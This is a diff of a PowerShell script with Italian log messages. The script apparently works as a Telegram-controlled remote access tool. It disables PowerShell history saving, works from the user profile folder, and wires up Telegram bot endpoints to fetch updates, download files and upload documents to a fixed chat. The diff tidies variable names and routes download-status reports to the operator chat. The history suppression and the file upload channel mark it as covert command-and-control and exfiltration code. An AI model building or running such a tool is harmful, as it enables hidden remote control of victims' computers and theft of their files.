@@ -4,14 +4,13 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
 
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$telegram_id = "@ID"
-$api_token = "@TOKEN"
-$api_get_updates = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
-$api_get_messages = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
-$api_get_file = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
-$api_download_file = 'https://api.telegram.org/file/bot{0}/' -f $api_token
-$api_upload_file = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
-$logs = $false
+$telegram_id, $api_token  = "@1", "@2"
+$api_get_updates    = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
+$api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
+$api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
+$api_download_file  = 'https://api.telegram.org/file/bot{0}/' -f $api_token
+$api_upload_file    = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
+$logs = $true
 $Global:ProgressPreference = 'SilentlyContinue'
 
 
@@ -48,9 +47,9 @@ function DownloadDocument ($file_id, $file_name)
 
     Log "Verifico che il file sia stato scaricato"
     if (Test-Path -Path $file_name) {
-        Log "File scaricato con successo"
+        SendMessage "File scaricato con successo"
     } else {
-        Log "Il file non è stato scaricato"
+        SendMessage "Il file non è stato scaricato"
     }
 }
 
@@ -82,7 +81,7 @@ function SendMessage ($output)
     $MessageToSend = $MessageToSend | ConvertTo-Json
 
     try {
-        Invoke-RestMethod -Method Post -Uri $api_get_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
+        Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
         Log "Messaggio inviato con successo"
     } catch {
         Log "Il messaggio non è stato inviato: [$($Error[0])]"
